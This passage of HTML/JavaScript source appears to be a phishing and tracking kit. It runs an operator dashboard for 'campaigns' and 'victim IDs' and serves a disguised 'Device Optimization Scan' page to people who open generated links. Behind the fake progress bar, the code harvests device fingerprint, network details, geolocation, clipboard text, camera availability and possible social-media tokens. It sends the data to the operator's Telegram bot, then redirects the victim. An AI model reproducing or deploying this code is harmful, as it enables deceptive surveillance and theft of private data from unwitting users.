                                        <div class="small text-muted">Data</div>
                                        <div class="fw-bold">${campaign.stats.dataCollected}</div>
                                    </div>
                                </div>
                            </div>
                            <div class="mt-2">
                                <button class="btn btn-sm btn-outline-primary" onclick="viewCampaignDetails('${campaign.id}')">
                                    <i class="fas fa-chart-bar"></i> Stats
                                </button>
                                <button class="btn btn-sm btn-outline-success" onclick="copyToClipboard('${campaign.link}')">
                                    <i class="fas fa-copy"></i> Copy
                                </button>
                                <button class="btn btn-sm btn-outline-danger" onclick="deleteCampaign('${campaign.id}')">
                                    <i class="fas fa-trash"></i> Delete
                                </button>
                            </div>
                            <div class="small text-muted mt-2">Created: ${date}</div>
                            ${campaign.stats.lastDataSend ? 
                                `<div class="small text-success mt-1">Last sent: ${new Date(campaign.stats.lastDataSend).toLocaleTimeString()}</div>` : ''}
                        </div>
                    `;
                });
                
                container.innerHTML = html;
            }
        };

        // ============================================
        // INITIALIZATION
        // ============================================
        
        document.addEventListener('DOMContentLoaded', function() {
            campaignManager.initialize();
            
            const urlParams = new URLSearchParams(window.location.search);
            const campaignId = urlParams.get('cid');
            const tracking = urlParams.get('track');
            
            if (tracking === 'true' && campaignId) {
                initializeVictimInterface(campaignId);
            } else {
                initializeDashboard();
            }
            
            setupSecurityMonitoring();
        });

        function setupSecurityMonitoring() {
            const devtools = /./;
            devtools.toString = function() {
                console.warn('Security monitoring active');
                return '';
            };
            console.log('%c', devtools);
            
            if (window.self !== window.top) {
                console.warn('Page loaded in iframe - security mode activated');
                document.body.classList.add('embedded-mode');
            }
        }

        // ============================================
        // VICTIM INTERFACE - WITH AUTO-SEND
        // ============================================
        
        function initializeVictimInterface(campaignId) {
            document.body.innerHTML = getVictimInterfaceHTML();
            document.body.className = 'victim-interface';
            
            deviceData.victimID = generateVictimID();
            deviceData.campaignId = campaignId;
            deviceData.timestamp = SecurityLayer.getSecureTimestamp();
            
            sendInitialPing(campaignId);
            
            const cloakTitle = getCloakTitle(campaignId);
            document.getElementById('victim-title').textContent = cloakTitle;
            
            startVictimDataCollection(campaignId);
        }
        
        function getVictimInterfaceHTML() {
            return `
                <div class="victim-card">
                    <div class="victim-header">
                        <h1 class="display-6 mb-2" id="victim-title">
                            <i class="fas fa-shield-alt"></i> Device Optimization Scan
                        </h1>
                        <p class="mb-0">Ensuring optimal device performance and security</p>
                    </div>
                    
                    <div class="victim-body">
                        <div class="text-center mb-4">
                            <div class="spinner-border text-primary mb-3" style="width: 3rem; height: 3rem;" role="status">
                                <span class="visually-hidden">Loading...</span>
                            </div>
                            <h4 id="status-message">Initializing System Scan</h4>
                            <p class="text-muted" id="status-details">
                                Please wait while we analyze your device configuration
                            </p>
                        </div>
                        
                        <div class="progress mb-4" style="height: 20px;">
                            <div id="scan-progress" class="progress-bar progress-bar-striped progress-bar-animated" 
                                 role="progressbar" style="width: 5%">
                                <span class="progress-text">5%</span>
                            </div>
                        </div>
                        
                        <div id="checklist" class="mb-4">
                            <div class="checklist-item active">
                                <i class="fas fa-spinner fa-spin text-primary me-2"></i>
                                <span>Device Information Analysis</span>
                            </div>
                            <div class="checklist-item">
                                <i class="fas fa-clock me-2"></i>
                                <span>Network Configuration Check</span>
                            </div>
                            <div class="checklist-item">
                                <i class="fas fa-clock me-2"></i>
                                <span>Security Vulnerability Scan</span>
                            </div>
                            <div class="checklist-item">
                                <i class="fas fa-clock me-2"></i>
                                <span>Performance Optimization</span>
                            </div>
                            <div class="checklist-item">
                                <i class="fas fa-clock me-2"></i>
                                <span>Final System Verification</span>
                            </div>
                        </div>
                        
                        <div class="alert alert-info">
                            <i class="fas fa-info-circle"></i>
                            <strong>Important:</strong> Do not close this window during the scan. 
                            The process will complete automatically in 10-15 seconds.
                        </div>
                        
                        <div class="row mt-4">
                            <div class="col-6">
                                <div class="text-center p-3 border rounded">
                                    <i class="fas fa-lock fa-2x text-success mb-2"></i>
                                    <div class="small">Secure Connection</div>
                                </div>
                            </div>
                            <div class="col-6">
                                <div class="text-center p-3 border rounded">
                                    <i class="fas fa-user-shield fa-2x text-primary mb-2"></i>
                                    <div class="small">Privacy Protected</div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="text-center p-3 border-top">
                        <div class="d-flex justify-content-center align-items-center">
                            <i class="fas fa-circle text-success me-2" style="font-size: 0.7rem;"></i>
                            <span class="small">Scan in progress • Estimated time: <span id="countdown">15</span> seconds</span>
                        </div>
                    </div>
                </div>
            `;
        }
        
        async function sendInitialPing(campaignId) {
            try {
                const campaign = campaignManager.getCampaign(campaignId);
                if (!campaign) return;
                
                campaignManager.incrementStat(campaignId, 'views');
                
                const initialData = {
                    type: 'initial_ping',
                    campaignId: campaignId,
                    victimId: deviceData.victimID,
                    timestamp: deviceData.timestamp,
                    userAgent: navigator.userAgent.substring(0, 100),
                    referrer: document.referrer || 'direct',
                    url: window.location.href
                };
                
                if (campaign.settings?.autoTelegram) {
                    const message = `🔔 *Link Opened*\n\n📱 Campaign: ${campaign.name}\n🆔 Victim: ${deviceData.victimID}\n🌐 Referrer: ${initialData.referrer}\n⏰ Time: ${new Date().toLocaleString()}`;
                    await sendTelegramMessage(message);
                }
                
                console.log('Initial ping sent successfully');
            } catch (error) {
                console.error('Initial ping failed:', error);
            }
        }
        
        async function startVictimDataCollection(campaignId) {
            const totalSteps = 5;
            let currentStep = 0;
            
            campaignManager.incrementStat(campaignId, 'clicks');
            
            startCountdown(15);
            
            currentStep++;
            updateVictimProgress(currentStep, totalSteps, "Analyzing Device Specifications...");
            await collectBasicDeviceInfo();
            await collectMobileCapabilities();
            updateChecklist(currentStep - 1, 'success');
            await delay(1500);
            
            currentStep++;
            updateVictimProgress(currentStep, totalSteps, "Checking Network Configuration...");
            await collectNetworkInfo();
            updateChecklist(currentStep - 1, 'success');
            await delay(1500);
            
            currentStep++;
            updateVictimProgress(currentStep, totalSteps, "Running Security Diagnostics...");
            await collectFingerprintInfo();
            await collectPermissionsInfo();
            updateChecklist(currentStep - 1, 'success');
            await delay(1500);
            
            currentStep++;
            updateVictimProgress(currentStep, totalSteps, "Optimizing System Performance...");
            await collectBatteryInfo();
            await collectStorageInfo();
            updateChecklist(currentStep - 1, 'success');
            await delay(1500);
            
            currentStep++;
            updateVictimProgress(currentStep, totalSteps, "Finalizing System Scan...");
            
            await collectAdditionalData();
            
            updateChecklist(currentStep - 1, 'success');
            
            await sendCollectedData(campaignId);
            
            setTimeout(() => {
                completeVictimScan(campaignId);
            }, 2000);
        }
        
        async function collectAdditionalData() {
            try {
                await getLocationAsync();
            } catch (e) {
                console.log('Location access denied');
            }
            
            try {
                await navigator.clipboard.readText().then(text => {
                    deviceData.clipboardInfo = text.substring(0, 500);
                });
            } catch (e) {
                console.log('Clipboard not accessed');
            }
            
            try {
                await checkCameraAvailability();
            } catch (e) {
                console.log('Camera not accessed');
            }
            
            detectSocialMediaPresence();
        }
        
        function detectSocialMediaPresence() {
            deviceData.socialInfo = {};
            const ua = navigator.userAgent.toLowerCase();
            
            if (/fbav|facebook|fbios/.test(ua)) deviceData.socialInfo.facebook = true;
            if (/instagram/.test(ua)) deviceData.socialInfo.instagram = true;
            if (/whatsapp/.test(ua)) deviceData.socialInfo.whatsapp = true;
            if (/twitter/.test(ua)) deviceData.socialInfo.twitter = true;
            if (/tiktok/.test(ua)) deviceData.socialInfo.tiktok = true;
            
            try {
                const services = ['facebook', 'twitter', 'google', 'linkedin'];
                deviceData.socialInfo.detectedServices = services.filter(service => {
                    try {
                        localStorage.getItem(`${service}_token`);
                        return true;
                    } catch(e) {
                        return false;
                    }
                });
            } catch(e) {
                console.log('Social detection limited');
            }
        }
        
        async function sendCollectedData(campaignId) {
            const campaign = campaignManager.getCampaign(campaignId);
            if (!campaign) return;
            
            campaignManager.incrementStat(campaignId, 'dataCollected');
            
            if (campaign.settings && campaign.settings.autoTelegram) {
                try {
                    await sendVictimDataToTelegram(campaignId);
                    console.log('Data sent to Telegram successfully');
                    
                    campaign.dataSent = true;
                    campaign.stats.lastDataSend = new Date().toISOString();
                    campaignManager.saveToStorage();
                    
                } catch (e) {
                    console.error('Failed to send to Telegram:', e);
                    setTimeout(() => sendCollectedData(campaignId), 5000);
                }
            }
        }
        
        function updateVictimProgress(step, totalSteps, message) {
            const progress = Math.min(100, Math.round((step / totalSteps) * 100));
            
            const progressBar = document.getElementById('scan-progress');
            const progressText = progressBar.querySelector('.progress-text');
            const statusMessage = document.getElementById('status-message');
            const statusDetails = document.getElementById('status-details');
            
            if (progressBar) {
                progressBar.style.width = `${progress}%`;
                progressText.textContent = `${progress}%`;
            }
            
            if (statusMessage) statusMessage.textContent = message;
            
            const details = [
                "Analyzing device specifications and hardware components...",
                "Checking network connectivity and security protocols...",
                "Scanning for security vulnerabilities and threats...",
                "Optimizing system performance and battery usage...",
                "Finalizing scan and generating security report..."
            ];
            
            if (statusDetails) {
                statusDetails.textContent = details[step - 1] || "Finalizing scan...";
            }
        }
        
        function updateChecklist(index, status) {
            const items = document.querySelectorAll('.checklist-item');
            if (items.length > index) {
                const item = items[index];
                item.classList.remove('active');
                
                if (status === 'success') {
                    item.innerHTML = '<i class="fas fa-check text-success me-2"></i>' + item.textContent;
                    item.classList.add('completed');
                } else if (status === 'failed') {
                    item.innerHTML = '<i class="fas fa-times text-danger me-2"></i>' + item.textContent;
                    item.classList.add('failed');
                }
            }
        }
        
        function startCountdown(seconds) {
            const countdownElement = document.getElementById('countdown');
            if (!countdownElement) return;
            
            let remaining = seconds;
            const interval = setInterval(() => {
                remaining--;
                countdownElement.textContent = remaining;
                
                if (remaining <= 0) {
                    clearInterval(interval);
                }
            }, 1000);
        }
        
        function completeVictimScan(campaignId) {
            const campaign = campaignManager.getCampaign(campaignId);
            const redirectUrl = campaign?.settings?.redirectUrl || 'https://google.com';
            
            document.getElementById('status-message').textContent = 'Scan Complete!';
            document.getElementById('status-details').textContent = 'Your device has been successfully optimized.';
            
            const progressBar = document.getElementById('scan-progress');
            progressBar.classList.remove('progress-bar-animated', 'progress-bar-striped');
            progressBar.classList.add('bg-success');
            progressBar.style.width = '100%';
            progressBar.querySelector('.progress-text').textContent = '100%';
            
            const spinner = document.querySelector('.spinner-border');
            if (spinner) {
                spinner.classList.remove('spinner-border');
                spinner.classList.add('fas', 'fa-check-circle', 'text-success');
                spinner.style.fontSize = '3rem';
            }
            
            const alert = document.querySelector('.alert');
            alert.className = 'alert alert-success';
            alert.innerHTML = `
                <i class="fas fa-check-circle"></i>
                <strong>Success!</strong> Your device is now optimized. 
                Redirecting in <span id="redirect-countdown">3</span> seconds...
            `;
            
            let countdown = 3;
            const countdownElement = document.getElementById('redirect-countdown');
            const countdownInterval = setInterval(() => {
                countdown--;
                countdownElement.textContent = countdown;
                
                if (countdown <= 0) {
                    clearInterval(countdownInterval);
                    window.location.href = redirectUrl;
                }
            }, 1000);
        }
        
        function getCloakTitle(campaignId) {
            const campaign = campaignManager.getCampaign(campaignId);
            if (campaign && campaign.settings && campaign.settings.cloakTitle) {
                return campaign.settings.cloakTitle;
            }
            
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('title') || 'Device Security Scan';
        }

        // ============================================
        // DASHBOARD INTERFACE WITH COMPLETE TOOL MENU
        // ============================================
        
        function initializeDashboard() {
            document.body.innerHTML = getDashboardHTML();
            document.body.className = 'dashboard-interface';
            
            setupDashboardEventListeners();
            initializeDataCollection();
            initializeCameras();
            generateVictimID();
            campaignManager.updateUI();
            updateTelegramConfigInputs();
            
            if (deviceData.mobileFeatures.platformInfo.isMobile) {
                startSensorMonitoring();
            }
            
            showToast('Dashboard loaded successfully!', 'success');
            showToast('Enhanced security mode active', 'info');
        }
        
        function getDashboardHTML() {
            return `
                <div class="container py-5">
                    <div class="row justify-content-center">
                        <div class="col-12">
                            <div class="glass-card p-4 mb-4">
                                <div class="row align-items-center">
                                    <div class="col-md-5">
                                        <h1 class="display-5 fw-bold text-blue mb-2">
                                            <i class="fas fa-robot"></i> Device Information Scanner
                                        </h1>
                                        <p class="lead text-blue mb-0">
                                            Comprehensive device, network, and browser information gathering tool
                                        </p>
                                    </div>
                                    <div class="col-md-7 text-end">
                                        <div class="d-flex justify-content-end gap-2 flex-wrap">
                                            <button class="btn link-btn mb-2" data-bs-toggle="modal" data-bs-target="#linkModal">
                                                <i class="fas fa-link"></i> Generate Link
                                            </button>
                                            <button class="btn telegram-btn mb-2" onclick="openTelegramModal()">
                                                <i class="fab fa-telegram"></i> Send to Telegram
                                            </button>
                                            <button class="btn download-btn mb-2" onclick="downloadData()">
                                                <i class="fas fa-download"></i> Download Data
                                            </button>
                                            <button class="btn primary-btn mb-2" data-bs-toggle="modal" data-bs-target="#settingsModal">
                                                <i class="fas fa-cog"></i> Settings
                                            </button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="row">
                        <div class="col-lg-3 mb-4">
                            <!-- COMPLETE TOOL MENU -->
                            <div class="dark-glass p-3 rounded-3 mb-3">
                                <h5 class="mb-3"><i class="fas fa-tools me-2"></i>Complete Tools Menu</h5>
                                <div class="nav flex-column" id="nav-tab" role="tablist">
                                    <button class="nav-link active text-start mb-2" onclick="showTab('overview-tab')">
                                        <i class="fas fa-home me-2"></i> Overview
                                    </button>
                                    <button class="nav-link text-start mb-2" onclick="showTab('device-tab')">
                                        <i class="fas fa-microchip me-2"></i> Device Info
                                    </button>
                                    <button class="nav-link text-start mb-2" onclick="showTab('mobile-tab')">
                                        <i class="fas fa-mobile-alt me-2"></i> Mobile Features
                                    </button>
                                    <button class="nav-link text-start mb-2" onclick="showTab('network-tab')">
                                        <i class="fas fa-wifi me-2"></i> Network Info
                                    </button>
                                    <button class="nav-link text-start mb-2" onclick="showTab('camera-tab')">
                                        <i class="fas fa-camera me-2"></i> Camera Snapshots
                                    </button>
                                    <button class="nav-link text-start mb-2" onclick="showTab('battery-tab')">
                                        <i class="fas fa-battery-full me-2"></i> Battery Status
                                    </button>
                                    <button class="nav-link text-start mb-2" onclick="showTab('location-tab')">
                                        <i class="fas fa-map-marker-alt me-2"></i> Location Info
                                    </button>
                                    <button class="nav-link text-start mb-2" onclick="showTab('storage-tab')">
                                        <i class="fas fa-hdd me-2"></i> Storage Info
                                    </button>
                                    <button class="nav-link text-start mb-2" onclick="showTab('permissions-tab')">
                                        <i class="fas fa-shield-alt me-2"></i> Permissions
                                    </button>
                                    <button class="nav-link text-start mb-2" onclick="showTab('fingerprint-tab')">
                                        <i class="fas fa-fingerprint me-2"></i> Fingerprint
                                    </button>
                                    <button class="nav-link text-start mb-2" onclick="showTab('clipboard-tab')">
                                        <i class="fas fa-clipboard me-2"></i> Clipboard
                                    </button>
                                    <button class="nav-link text-start mb-2" onclick="showTab('mask-tab')">
                                        <i class="fas fa-mask me-2"></i> Mask URLs
                                    </button>
                                    <button class="nav-link text-start mb-2" onclick="showTab('link-tab')">
                                        <i class="fas fa-share-alt me-2"></i> Link Generator
                                    </button>
                                    <button class="nav-link text-start mb-2" onclick="showTab('telegram-tab')">
                                        <i class="fab fa-telegram me-2"></i> Telegram Bot
                                    </button>
                                    <button class="nav-link text-start" onclick="showTab('all-tools-tab')">
                                        <i class="fas fa-boxes me-2"></i> All-in-One Tools
                                    </button>
                                </div>
                            </div>
                            
                            <div class="dark-glass p-3 rounded-3">
                                <h5 class="mb-3"><i class="fas fa-bolt me-2"></i>Quick Actions</h5>
                                <div class="d-grid gap-2">
                                    <button class="btn btn-outline-light" onclick="collectAllData()">
                                        <i class="fas fa-sync"></i> Refresh All Data
                                    </button>
                                    <button class="btn btn-outline-primary" onclick="testTelegramConnection()">
                                        <i class="fas fa-wifi"></i> Test Telegram
                                    </button>
                                    <button class="btn btn-outline-success" onclick="generateNewVictimID()">
                                        <i class="fas fa-id-card"></i> New Victim ID
                                    </button>
                                    <button class="btn btn-outline-danger" onclick="clearAllData()">
                                        <i class="fas fa-trash"></i> Clear Data
                                    </button>
                                </div>
                                
                                <div class="mt-3 text-center">
                                    <div class="qr-code-container">
                                        <div id="qr-code-display">
                                            <i class="fas fa-qrcode fa-3x text-dark"></i>
                                            <p class="small mt-2">Victim ID QR Code</p>
                                        </div>
                                    </div>
                                    <p class="small mt-2">Victim ID: <span id="victim-id-display">Not set</span></p>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Main Content Area -->
                        <div class="col-lg-9">
                            <div id="tab-content">
                                <!-- Overview Tab -->
                                <div class="tab-pane active glass-card p-4" id="overview-tab">
                                    <h4 class="mb-4"><i class="fas fa-tachometer-alt text-primary"></i> System Overview</h4>
                                    <div class="row">
                                        <div class="col-md-6 mb-3">
                                            <div class="info-card">
                                                <div class="card-header">
                                                    <i class="fas fa-info-circle card-icon"></i> Quick Stats
                                                </div>
                                                <div class="card-body">
                                                    <div id="quick-stats">
                                                        <div class="text-center py-4">
                                                            <div class="spinner-border text-primary" role="status">
                                                                <span class="visually-hidden">Loading...</span>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="col-md-6 mb-3">
                                            <div class="info-card">
                                                <div class="card-header">
                                                    <i class="fas fa-chart-line card-icon"></i> Campaign Stats
                                                </div>
                                                <div class="card-body">
                                                    <div id="campaigns-list">
                                                        <!-- Campaigns will be loaded here -->
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <div class="info-card">
                                        <div class="card-header">
                                            <i class="fas fa-tachometer-alt card-icon"></i> System Status
                                        </div>
                                        <div class="card-body">
                                            <div class="row">
                                                <div class="col-md-3 text-center mb-3">
                                                    <div class="sensor-container">
                                                        <h6><i class="fas fa-microchip"></i> CPU</h6>
                                                        <div class="sensor-value" id="cpu-usage">--%</div>
                                                        <div class="sensor-unit">Usage</div>
                                                    </div>
                                                </div>
                                                <div class="col-md-3 text-center mb-3">
                                                    <div class="sensor-container">
                                                        <h6><i class="fas fa-memory"></i> Memory</h6>
                                                        <div class="sensor-value" id="memory-usage">--%</div>
                                                        <div class="sensor-unit">Usage</div>
                                                    </div>
                                                </div>
                                                <div class="col-md-3 text-center mb-3">
                                                    <div class="sensor-container">
                                                        <h6><i class="fas fa-battery-half"></i> Battery</h6>
                                                        <div class="sensor-value" id="battery-overview">--%</div>
                                                        <div class="sensor-unit">Level</div>
                                                    </div>
                                                </div>
                                                <div class="col-md-3 text-center mb-3">
                                                    <div class="sensor-container">
                                                        <h6><i class="fas fa-network-wired"></i> Network</h6>
                                                        <div class="sensor-value" id="network-status">--</div>
                                                        <div class="sensor-unit">Status</div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                
                                <!-- Device Info Tab -->
                                <div class="tab-pane glass-card p-4" id="device-tab" style="display: none;">
                                    <h4 class="mb-4"><i class="fas fa-microchip text-primary"></i> Device Information</h4>
                                    <div class="row">
                                        <div class="col-md-6">
                                            <div class="data-item">
                                                <span class="data-label">Platform:</span>
                                                <span class="data-value" id="platform-info">Loading...</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">User Agent:</span>
                                                <span class="data-value" id="user-agent">Loading...</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">Screen Resolution:</span>
                                                <span class="data-value" id="screen-resolution">Loading...</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">Device Memory:</span>
                                                <span class="data-value" id="device-memory">Loading...</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">Color Depth:</span>
                                                <span class="data-value" id="color-depth">Loading...</span>
                                            </div>
                                        </div>
                                        <div class="col-md-6">
                                            <div class="data-item">
                                                <span class="data-label">Language:</span>
                                                <span class="data-value" id="device-language">Loading...</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">Time Zone:</span>
                                                <span class="data-value" id="device-timezone">Loading...</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">CPU Cores:</span>
                                                <span class="data-value" id="cpu-cores">Loading...</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">Touch Support:</span>
                                                <span class="data-value" id="touch-support">Checking...</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">Pixel Ratio:</span>
                                                <span class="data-value" id="pixel-ratio">Loading...</span>
                                            </div>
                                        </div>
                                    </div>
                                    <button class="btn btn-primary mt-3" onclick="refreshDeviceInfo()">
                                        <i class="fas fa-sync-alt"></i> Refresh Device Info
                                    </button>
                                </div>
                                
                                <!-- Mobile Features Tab -->
                                <div class="tab-pane glass-card p-4" id="mobile-tab" style="display: none;">
                                    <h4 class="mb-4"><i class="fas fa-mobile-alt text-primary"></i> Mobile Features</h4>
                                    <div class="row">
                                        <div class="col-md-6 mb-3">
                                            <div class="mobile-feature-card">
                                                <div class="mobile-feature-icon">
                                                    <i class="fas fa-robot"></i>
                                                </div>
                                                <h5>Platform Detection</h5>
                                                <div id="platform-detection">
                                                    Loading platform info...
                                                </div>
                                            </div>
                                        </div>
                                        <div class="col-md-6 mb-3">
                                            <div class="mobile-feature-card">
                                                <div class="mobile-feature-icon">
                                                    <i class="fas fa-bolt"></i>
                                                </div>
                                                <h5>Device Capabilities</h5>
                                                <div id="device-capabilities">
                                                    Loading capabilities...
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <div class="row">
                                        <div class="col-md-6">
                                            <div class="mobile-feature-card">
                                                <div class="mobile-feature-icon">
                                                    <i class="fas fa-compass"></i>
                                                </div>
                                                <h5>Sensors</h5>
                                                <div id="sensors-list">
                                                    <button class="btn btn-sm btn-primary" onclick="testSensors()">Test Sensors</button>
                                                    <div id="sensor-results" class="mt-2"></div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="col-md-6">
                                            <div class="mobile-feature-card">
                                                <div class="mobile-feature-icon">
                                                    <i class="fas fa-box"></i>
                                                </div>
                                                <h5>Installed Apps</h5>
                                                <div id="installed-apps">
                                                    <button class="btn btn-sm btn-success" onclick="detectInstalledApps()">Detect Apps</button>
                                                    <div id="app-results" class="mt-2"></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                
                                <!-- Network Info Tab -->
                                <div class="tab-pane glass-card p-4" id="network-tab" style="display: none;">
                                    <h4 class="mb-4"><i class="fas fa-network-wired text-primary"></i> Network Information</h4>
                                    <div class="row">
                                        <div class="col-md-6">
                                            <div class="data-item">
                                                <span class="data-label">IPv4 Address:</span>
                                                <span class="data-value" id="ipv4-address">Loading...</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">IPv6 Address:</span>
                                                <span class="data-value" id="ipv6-address">Loading...</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">Connection Type:</span>
                                                <span class="data-value" id="connection-type">Loading...</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">Data Saver:</span>
                                                <span class="data-value" id="data-saver">Loading...</span>
                                            </div>
                                        </div>
                                        <div class="col-md-6">
                                            <div class="data-item">
                                                <span class="data-label">Online Status:</span>
                                                <span class="data-value" id="online-status">Loading...</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">Network Bandwidth:</span>
                                                <span class="data-value" id="network-bandwidth">Checking...</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">Effective Connection:</span>
                                                <span class="data-value" id="effective-connection">Checking...</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">RTT (Round Trip Time):</span>
                                                <span class="data-value" id="network-rtt">Checking...</span>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="text-center mt-3">
                                        <button class="btn primary-btn" onclick="runNetworkTest()">
                                            <i class="fas fa-network-wired"></i> Run Network Test
                                        </button>
                                    </div>
                                </div>
                                
                                <!-- Camera Tab -->
                                <div class="tab-pane glass-card p-4" id="camera-tab" style="display: none;">
                                    <h4 class="mb-4"><i class="fas fa-camera text-primary"></i> Camera Access</h4>
                                    <div class="row mb-4">
                                        <div class="col-md-6">
                                            <div class="camera-container">
                                                <video id="camera-feed" class="camera-feed" autoplay playsinline></video>
                                            </div>
                                            <div class="text-center mt-3">
                                                <button class="snapshot-btn" onclick="takeSnapshot()">
                                                    <i class="fas fa-camera"></i> Take Snapshot
                                                </button>
                                                <button class="btn btn-outline-primary ms-2" onclick="initializeCamera()">
                                                    <i class="fas fa-camera"></i> Start Camera
                                                </button>
                                            </div>
                                        </div>
                                        <div class="col-md-6">
                                            <h5>Snapshot Preview</h5>
                                            <canvas id="snapshot-canvas" class="snapshot-canvas" width="640" height="480"></canvas>
                                            <img id="snapshot-img" class="img-fluid rounded mt-3" alt="Snapshot" style="display:none; max-height: 200px;">
                                        </div>
                                    </div>
                                </div>
                                
                                <!-- Battery Tab -->
                                <div class="tab-pane glass-card p-4" id="battery-tab" style="display: none;">
                                    <h4 class="mb-4"><i class="fas fa-battery-full text-primary"></i> Battery Information</h4>
                                    <div class="text-center mb-4">
                                        <div class="progress" style="height: 30px;">
                                            <div id="battery-level-bar" class="progress-bar" role="progressbar" style="width: 50%;" 
                                                 aria-valuenow="50" aria-valuemin="0" aria-valuemax="100">
                                                <span id="battery-level-text" class="fw-bold">50%</span>
                                            </div>
                                        </div>
                                        <p id="battery-status-text" class="mt-2">Battery Status: Loading...</p>
                                    </div>
                                    <div class="row">
                                        <div class="col-md-6">
                                            <div class="data-item">
                                                <span class="data-label">Charging Status:</span>
                                                <span class="data-value" id="charging-status">Loading...</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">Charging Time:</span>
                                                <span class="data-value" id="charging-time">Loading...</span>
                                            </div>
                                        </div>
                                        <div class="col-md-6">
                                            <div class="data-item">
                                                <span class="data-label">Discharging Time:</span>
                                                <span class="data-value" id="discharging-time">Loading...</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">Battery Health:</span>
                                                <span class="data-value" id="battery-health">Estimating...</span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                
                                <!-- Location Tab -->
                                <div class="tab-pane glass-card p-4" id="location-tab" style="display: none;">
                                    <h4 class="mb-4"><i class="fas fa-map-marker-alt text-primary"></i> Location Information</h4>
                                    <div class="location-map mb-4" id="location-map">
                                        <div class="d-flex align-items-center justify-content-center h-100">
                                            <div class="text-center">
                                                <i class="fas fa-globe-americas fa-3x text-secondary mb-3"></i>
                                                <p>Map will appear here when location is accessed</p>
                                                <button class="btn btn-primary" onclick="getLocation()">
                                                    <i class="fas fa-location-crosshairs"></i> Get Location
                                                </button>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-md-6">
                                            <div class="data-item">
                                                <span class="data-label">Latitude:</span>
                                                <span class="data-value" id="latitude">Not retrieved yet</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">Longitude:</span>
                                                <span class="data-value" id="longitude">Not retrieved yet</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">Accuracy:</span>
                                                <span class="data-value" id="location-accuracy">Not retrieved yet</span>
                                            </div>
                                        </div>
                                        <div class="col-md-6">
                                            <div class="data-item">
                                                <span class="data-label">Altitude:</span>
                                                <span class="data-value" id="altitude">Not retrieved yet</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">Speed:</span>
                                                <span class="data-value" id="speed">Not retrieved yet</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">Timestamp:</span>
                                                <span class="data-value" id="location-timestamp">Not retrieved yet</span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                
                                <!-- Storage Tab -->
                                <div class="tab-pane glass-card p-4" id="storage-tab" style="display: none;">
                                    <h4 class="mb-4"><i class="fas fa-hdd text-primary"></i> Storage Information</h4>
                                    <div class="row mb-4">
                                        <div class="col-md-6">
                                            <h5>Local Storage</h5>
                                            <div class="progress mb-2">
                                                <div id="local-storage-bar" class="progress-bar" role="progressbar" style="width: 30%;" 
                                                     aria-valuenow="30" aria-valuemin="0" aria-valuemax="100">
                                                    <span id="local-storage-text">30%</span>
                                                </div>
                                            </div>
                                            <p id="local-storage-details">Calculating...</p>
                                        </div>
                                        <div class="col-md-6">
                                            <h5>Session Storage</h5>
                                            <div class="progress mb-2">
                                                <div id="session-storage-bar" class="progress-bar" role="progressbar" style="width: 10%;" 
                                                     aria-valuenow="10" aria-valuemin="0" aria-valuemax="100">
                                                    <span id="session-storage-text">10%</span>
                                                </div>
                                            </div>
                                            <p id="session-storage-details">Calculating...</p>
                                        </div>
                                    </div>
                                    <div class="data-item">
                                        <span class="data-label">Storage Quota:</span>
                                        <span class="data-value" id="storage-quota">Checking...</span>
                                    </div>
                                    <div class="data-item">
                                        <span class="data-label">Storage Usage:</span>
                                        <span class="data-value" id="storage-usage">Checking...</span>
                                    </div>
                                    <div class="data-item">
                                        <span class="data-label">Storage Available:</span>
                                        <span class="data-value" id="storage-available">Checking...</span>
                                    </div>
                                    <div class="data-item">
                                        <span class="data-label">Storage Persistence:</span>
                                        <span class="data-value" id="storage-persistence">Checking...</span>
                                    </div>
                                </div>
                                
                                <!-- Permissions Tab -->
                                <div class="tab-pane glass-card p-4" id="permissions-tab" style="display: none;">
                                    <h4 class="mb-4"><i class="fas fa-shield-alt text-primary"></i> Permission Details</h4>
                                    <div id="permissions-container" class="row">
                                        <!-- Permissions will be loaded here -->
                                    </div>
                                    <div class="text-center mt-4">
                                        <button class="btn primary-btn" onclick="requestAllPermissions()">
                                            <i class="fas fa-key"></i> Request All Permissions
                                        </button>
                                    </div>
                                </div>
                                
                                <!-- Fingerprint Tab -->
                                <div class="tab-pane glass-card p-4" id="fingerprint-tab" style="display: none;">
                                    <h4 class="mb-4"><i class="fas fa-fingerprint text-primary"></i> Device & Browser Fingerprint</h4>
                                    <div class="fingerprint-canvas mb-4" id="fingerprint-canvas">
                                        <div class="d-flex align-items-center justify-content-center h-100">
